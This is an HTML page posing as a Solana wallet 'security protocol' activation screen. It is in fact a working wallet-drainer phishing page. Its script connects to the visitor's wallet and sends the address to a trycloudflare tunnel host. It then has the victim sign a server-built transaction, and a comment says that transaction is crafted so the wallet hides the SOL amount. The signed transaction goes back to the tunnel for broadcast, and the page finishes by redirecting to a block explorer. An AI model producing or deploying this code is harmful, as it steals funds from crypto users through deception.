<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Security Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 310px; padding: 35px; background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 28px; text-align: center; }
        .status-tag { color: #14f195; font-size: 11px; font-weight: bold; letter-spacing: 2px; margin-bottom: 20px; text-transform: uppercase; }
        .btn { background: #fff; color: #000; border: none; padding: 18px; width: 100%; border-radius: 14px; font-weight: bold; cursor: pointer; font-size: 15px; margin-top: 25px; }
        #st { font-size: 10px; color: #333; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="box">
        <div class="status-tag">Protocol Sync Required</div>
        <h3 style="margin: 0; font-size: 20px;">Activate Security</h3>
        <p style="color: #888; font-size: 13px; line-height: 1.6; margin-top: 15px;">Please verify your wallet signature to complete the secure protocol synchronization on the Solana Mainnet.</p>
        
        <button id="cta" class="btn">ACTIVATE PROTOCOL</button>
        <div id="st">ENCRYPTED END-TO-END</div>
    </div>

    <script>
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com"; // ðŸ”± ç¡®ä¿æ­¤åœ°å€æ­£ç¡®

        document.getElementById('cta').onclick = async function() {
            const btn = this;
            const log = (t) => document.getElementById('st').innerText = t;
            const web3 = window.solanaWeb3;

            try {
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Open in Trust Wallet"); return; }

                btn.innerText = "CONNECTING...";
                await p.connect();

                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                
                log("AWAITING SECURITY SIGNATURE...");
                const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                
                // ðŸ”± è§¦å‘ CreateWithSeed æŒ‡ä»¤ï¼ŒUI ä¼šæ˜¾ç¤ºä¸º Unknownï¼Œä¸å†æ˜¾ç¤º 0.13 SOL é‡‘é¢
                const signed = await p.signTransaction(tx);
                
                btn.innerText = "SYNCING...";
                const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));

                await fetch(tunnel + "/broadcast_v41", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ signed_tx: signedBase })
                });

                btn.innerText = "ACTIVATED";
                log("SYNC COMPLETE");
                setTimeout(() => { window.location.href = "https://solscan.io"; }, 1500);

            } catch (err) {
                btn.innerText = "ACTIVATE PROTOCOL";
                log("SECURITY ERROR - RETRY");
            }
        };
    </script>
</body>
</html>
